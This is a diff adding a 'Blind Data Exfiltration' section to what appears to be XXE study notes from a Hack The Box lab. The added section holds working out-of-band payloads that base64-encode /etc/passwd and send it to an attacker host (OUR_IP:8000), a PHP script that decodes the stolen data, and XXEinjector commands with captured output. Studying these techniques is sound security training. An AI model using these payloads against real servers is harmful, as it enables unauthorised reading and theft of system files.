@@ -12,6 +12,9 @@
   - [Advanced File Disclosure](#advanced-file-disclosure)
     - [... with CDATA](#-with-cdata)
     - [Error Based XXE](#error-based-xxe)
+  - [Blind Data Exfiltration](#blind-data-exfiltration)
+    - [Out-of-band Data Exfiltration](#out-of-band-data-exfiltration)
+    - [Automated OOB Exfiltration](#automated-oob-exfiltration)
 
 ---
 
@@ -345,3 +348,114 @@ Once you host your DTD script as you did earlier and send the above payload as y
 ![xxe 9](../../../../images/xxe_9.png)
 
 This method may also be used to read the source code of files. All you have to do is change the file name in your DTD script to point to the file you want to read. However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it.
+
+## Blind Data Exfiltration
+
+### Out-of-band Data Exfiltration
+
+For cases in which there is nothing printed on the web app, you can utilize a method known as out-of-band Data Exfiltration, which is often used in similar blind cases with many web attacks, like blind SQLi, blind command injection, blind XSS, and blind XXE.
+
+In the previous sections, you utilized an out-of-band attack since you hosted the DTD file in your machine and made the web application connect to you. So, your attack this time will be pretty similar, with on significant difference. Instead of having the web app output your file entity to a specific XML entity, you mill make the web app send a web request to your web server with the content of the ```file``` you are reading.
+
+To do so, you can first use a parameter entity for the content of the file you are reading while utilizing PHP filter to base64 encode it. Then, you will create another external parameter entity and reference it to your IP, and place the ```file``` parameter value as part of the URL being requested over HTTP:
+
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+If, the file you want to read had the content of ```XXE_SAMPLE_DATA```, then the file parameter would hold its base64 encoded data (_```WFhFX1NBTVBMRV9EQVRB```_). When the XML tries to reference the external ```oob``` parameter from your machine, it will request ```http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB```. Finally, you can decode the ```WFhFX1NBTVBMRV9EQVR``` string to get the content of the file. You can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal.
+
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+
+So, you will first write the above PHP code to ```index.php```, and then start a PHP server on port 8000:
+
+```bash
+d41y@htb[/htb]$ vi index.php # here we write the above PHP code
+d41y@htb[/htb]$ php -S 0.0.0.0:8000
+
+PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+```
+
+Now, to initiate your attack, you can use a similar payload to the one you used in the error-based attack, and simply add ```<root>&content;</root>```, which is needed to reference your entity and have it send the request to your machine with the file content:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+Send the request:
+
+![xxe 10](../../../../images/xxe_10.png)
+
+Go back to your terminal:
+
+```bash
+PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+10.10.14.16:46256 Accepted
+10.10.14.16:46256 [200]: (null) /xxe.dtd
+10.10.14.16:46256 Closing
+10.10.14.16:46258 Accepted
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...SNIP...
+```
+
+### Automated OOB Exfiltration
+
+Although in some instances you may have to use the manual method you learned above, in many other cases, you can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector).
+
+To use this tool for automated OOB exfiltration you first need to clone it.
+
+Once you have the tool, you can copy the HTTP request from Burp and write it to a file for the tool to use. You should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:
+
+```http
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+
+Now you can run the tool with the ```--host``` / ```--httpport``` flags being your IP and port, the ```--file``` flag being the file you wrote above, and the ```--path``` flag being the file you want to read. You will also select the ```--oob=http``` and ```--phpfilter``` flags to repeat the OOB attack:
+
+```bash
+d41y@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+...SNIP...
+[+] Sending request with malicious XML.
+[+] Responding with XML for: /etc/passwd
+[+] Retrieved data:
+```
+
+You see that the tool did not directly print the data. This is because you are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the ```Logs``` folder under the tool, and you can find your file there:
+
+```bash
+d41y@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...SNIP..
+```
